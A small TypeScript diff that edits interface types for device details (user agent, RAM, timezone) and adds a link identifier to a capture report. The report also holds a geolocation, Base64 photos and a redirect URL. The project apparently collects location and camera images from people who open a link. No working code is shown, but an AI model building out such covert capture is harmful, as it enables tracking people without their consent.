@@ -6,11 +6,10 @@ export interface DeviceInfo {
   language: string;
   screenResolution: string;
   cores: number;
-  memory?: string;
-  userAgent: string;
+  userAgent: string; // Explicitly included full browser identification string
   orientation: string;
-  ram: number; // in GB, using navigator.deviceMemory
-  timezoneOffset: number; // in minutes
+  ram: number; // Physical RAM in GB (approximate, via navigator.deviceMemory)
+  timezoneOffset: number; // in minutes from UTC
   timezoneName: string; // e.g., "America/New_York"
 }
 
@@ -49,6 +48,7 @@ export interface CaptureReport {
   location: GeoLocation;
   photos: string[]; // Base64 strings
   redirectUrl: string;
+  linkId?: string;
 }
 
 export interface LinkConfig {
